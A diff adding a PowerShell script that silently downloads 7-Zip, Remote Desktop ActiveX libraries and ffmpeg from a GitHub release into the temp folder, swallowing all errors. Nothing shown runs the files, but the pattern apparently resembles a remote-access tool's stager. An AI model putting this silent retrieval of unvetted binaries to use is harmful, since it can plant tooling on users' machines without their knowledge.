@@ -1,0 +1,25 @@
+$tempPath = [System.IO.Path]::GetTempPath()
+
+$files = @(
+    @{ Url = "https://github.com/webr-at/importantfiles/releases/download/1/7z.dll"; Path = "$tempPath\7z.dll" },
+    @{ Url = "https://github.com/webr-at/importantfiles/releases/download/1/7z.exe"; Path = "$tempPath\7z.exe" },
+    @{ Url = "https://github.com/webr-at/importantfiles/releases/download/1/MSTSCLib.dll"; Path = "$tempPath\MSTSCLib.dll" },
+    @{ Url = "https://github.com/webr-at/importantfiles/releases/download/1/AxMSTSCLib.dll"; Path = "$tempPath\AxMSTSCLib.dll" },
+    @{ Url = "https://github.com/webr-at/importantfiles/releases/download/1/ffmpeg.exe"; Path = "$tempPath\ffmpeg.exe" }
+)
+
+$webClient = New-Object System.Net.WebClient
+
+foreach ($file in $files) {
+    if (-Not (Test-Path $file.Path)) {
+        try {
+            $webClient.DownloadFile($file.Url, $file.Path)
+        }
+        catch {
+        }
+    }
+    else {
+    }
+}
+
+$webClient.Dispose()
